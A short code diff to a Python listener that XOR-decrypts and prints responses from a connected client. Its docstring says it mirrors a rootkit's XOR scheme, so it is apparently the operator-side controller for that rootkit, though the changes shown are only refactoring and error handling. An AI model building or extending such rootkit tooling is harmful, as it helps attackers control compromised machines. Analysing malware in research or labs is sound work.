@@ -9,15 +9,12 @@ PORT = 4242
 
 def xor(data: bytes) -> bytes:
     """
-    Implements XOR encryption/decryption using the key.
-    Each byte of input is XORed with the corresponding byte of the key (cycling if needed).
+    Implements the same XOR logic as the rootkit:
+    decrypted[i] = buffer[i] ^ config.xor_key[i % strlen(config.xor_key)]
     """
     result = bytearray()
-    key_bytes = KEY.encode('ascii')
-    key_len = len(key_bytes)
-
-    for i, byte in enumerate(data):
-        result.append(byte ^ key_bytes[i % key_len])
+    for i, b in enumerate(data):
+        result.append(b ^ ord(KEY[i % len(KEY)]))
     return bytes(result)
 
 def debug_print(msg: str, data: bytes = None):
@@ -95,10 +92,12 @@ def handle_client(client):
                     debug_print("Decrypted response", response)
 
                     try:
-                        response = response.decode('ascii', errors='ignore')
-                        print(response.strip().replace('--EOF--', ''))
+                        response = response.decode('ascii')
+                        print(response.strip())
                     except UnicodeDecodeError:
                         print("Warning: Received corrupted response")
+                        response = response.decode('ascii', errors='ignore')
+                        print(response.strip())
 
             except KeyboardInterrupt:
                 break
